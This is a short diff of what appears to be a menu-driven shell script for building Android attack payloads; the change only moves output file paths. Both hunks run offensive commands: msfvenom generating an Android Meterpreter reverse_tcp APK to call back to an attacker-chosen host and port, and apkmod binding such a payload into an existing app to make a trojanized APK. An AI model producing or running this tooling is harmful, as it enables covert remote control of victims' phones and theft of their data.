@@ -159,7 +159,7 @@ case $ch in
 	read lport
 	echo -ne $BOLD [*] "Enter your apk file name here [with extension!!!!!]: "
 	read apk
-	msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/$apk || echo -e $RED Invalid Apk!!!!
+	msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $apk || echo -e $RED Invalid Apk!!!!
 	echo -e $BOLD ""
 	echo -e "\e[36m PAYLOAD CREATED CHECK IN YOUR FILE MANAGER \e[0m"
 	sleep 5
@@ -174,7 +174,7 @@ case $ch in
 	read lport
 	echo -ne $BOLD [*] "Enter path to apk you want to bind: "
 	read path
-	apkmod -b $path -o /sdcard/bindedmsf.apk LHOST=$lhost LPORT=$lport || apkmod -u
+	apkmod -b $path -o /storage/bindedmsf.apk LHOST=$lhost LPORT=$lport || apkmod -u
 	echo -e $BOLD ""
 	echo -e "\e[36m PAYLOAD CREATED CHECK IN YOUR FILE MANAGER \033[0m"
 	sleep 5
